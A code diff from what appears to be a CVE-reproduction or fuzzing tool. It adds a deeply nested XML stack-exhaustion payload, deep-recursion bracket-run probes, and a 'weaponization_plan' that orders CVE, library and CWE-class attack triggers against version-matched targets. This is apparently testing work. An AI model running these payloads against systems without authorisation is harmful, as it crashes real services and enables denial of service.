@@ -63,6 +63,19 @@ def _zip_bomb(expand_gb: int = 8) -> Trigger:
                         f"inflates without an output cap")
 
 
+def _xml_deep_nesting(depth: int = 60000) -> Trigger:
+    """Deeply-nested XML elements (CWE-776, stack exhaustion): a recursive-descent parser recurses
+    once per open tag, so tens of thousands of nested elements blow the stack and crash it. A
+    DIFFERENT vector from entity expansion (billion-laughs) -- it trips parsers that cap entity
+    amplification but not element depth. A crash (SIGSEGV from stack overflow) or an OOM/timeout
+    under the tight cve_poc budget both count as the fault."""
+    data = b'<?xml version="1.0"?>\n' + b"<a>" * depth + b"</a>" * depth
+    return Trigger(cve="class:CWE-776", data=data, channel="file", cwe="CWE-776",
+                   libraries=("expat", "libexpat", "libxml2", "expat2"),
+                   note=f"{depth}-deep nested-element XML -- stack-exhaustion DoS of a recursive "
+                        f"parser without a depth limit")
+
+
 def _billion_laughs() -> Trigger:
     """XML entity-expansion DoS (CWE-776 'billion laughs'): nested entities expand to billions of
     characters, exhausting memory in a parser without an amplification limit. Modern expat/libxml2
@@ -89,9 +102,10 @@ _TRIGGERS = {
 # attacks a version match implies, independent of the specific CVE).
 _LIBRARY_TRIGGERS = {
     "zlib": [_zip_bomb],
-    "expat": [_billion_laughs],
-    "libexpat": [_billion_laughs],
-    "libxml2": [_billion_laughs],
+    "expat": [_billion_laughs, _xml_deep_nesting],
+    "libexpat": [_billion_laughs, _xml_deep_nesting],
+    "expat2": [_billion_laughs, _xml_deep_nesting],
+    "libxml2": [_billion_laughs, _xml_deep_nesting],
 }
 
 
@@ -134,6 +148,58 @@ _OVERFLOW_CWES = {"CWE-787", "CWE-121", "CWE-120", "CWE-119", "CWE-122", "CWE-12
                   "CWE-190", "CWE-131", "CWE-416", "CWE-788", "CWE-126"}
 _FMT_CWES = {"CWE-134"}
 _CMDI_CWES = {"CWE-78", "CWE-77"}
+# Uncontrolled recursion / stack exhaustion: a recursive-descent parser that recurses per nesting
+# level crashes (SIGSEGV) or hangs on a pathologically deep input. Bracket/paren/brace runs probe
+# the common cases (JSON, expression and config parsers) without needing a specific grammar.
+_RECURSION_CWES = {"CWE-674", "CWE-776"}
+
+
+@dataclass
+class PlanItem:
+    label: str                      # human label for the recorded finding
+    trigger: Trigger
+    confidence: float
+    group: str = ""                 # "" = always try; else stop at first fault within the group
+
+
+def weaponization_plan(matched) -> list:
+    """The ordered weaponization steps for a target's version-matched CVEs, as PlanItems. PURE
+    (no detonation), so the selection -- which is the whole CVE->exploit chain -- is unit-testable
+    independent of a live target.
+
+    `matched` is an iterable of (cve_id, library, cwe). The plan is, in fidelity order:
+      1. hand-authored CVE-specific triggers (confidence 0.95, always tried)
+      2. library-level format triggers per distinct matched library (0.85) -- e.g. a zlib bomb or
+         XML billion-laughs; the version match alone implies these format-level attacks
+      3. generic CWE-class triggers per distinct CWE, for CVEs WITHOUT a bespoke trigger (0.80)
+    Steps 2 and 3 carry a `group` so the stage records one reproduction per library / per CWE
+    (the first that faults) rather than every payload. A fixed/unaffected target simply never
+    faults and is never flagged -- the plan is attempts, the stage records only real faults."""
+    matched = [(str(c or "").upper(), (lib or "").lower(), (cwe or "").upper())
+               for c, lib, cwe in matched]
+    plan: list = []
+    # 1) bespoke, CVE-specific
+    for cve, _lib, _cwe in matched:
+        trig = for_cve(cve)
+        if trig is not None:
+            plan.append(PlanItem(cve, trig, 0.95))
+    # 2) library-level, once per distinct library
+    seen_lib = set()
+    for cve, lib, _cwe in matched:
+        if not lib or lib in seen_lib:
+            continue
+        seen_lib.add(lib)
+        for trig in library_triggers(lib):
+            plan.append(PlanItem(f"{cve} ({lib} {trig.cwe})", trig, 0.85, group=f"lib:{lib}"))
+    # 3) CWE-class, once per distinct CWE, for CVEs with no bespoke trigger
+    seen_cwe = set()
+    for cve, _lib, cwe in matched:
+        if for_cve(cve) is not None or not cwe or cwe in seen_cwe:
+            continue
+        seen_cwe.add(cwe)
+        for trig in class_triggers(cwe):
+            plan.append(PlanItem(f"{cve} ({cwe} class)", trig, 0.80, group=f"cwe:{cwe}"))
+    return plan
 
 
 def class_triggers(cwe: str) -> list:
@@ -156,4 +222,10 @@ def class_triggers(cwe: str) -> list:
             for ch in ("arg", "stdin", "file"):
                 out.append(Trigger(cve=f"class:{cwe}", data=pat, channel=ch, cwe=cwe,
                                    note=f"generic command-injection probe for {cwe}"))
+    elif cwe in _RECURSION_CWES:
+        for opener in (b"[", b"(", b"{", b"<a>"):
+            for n in (50000, 200000):
+                for ch in ("stdin", "file"):
+                    out.append(Trigger(cve=f"class:{cwe}", data=opener * n, channel=ch, cwe=cwe,
+                                       note=f"deep-recursion probe ({n}x {opener!r}) for {cwe}"))
     return out
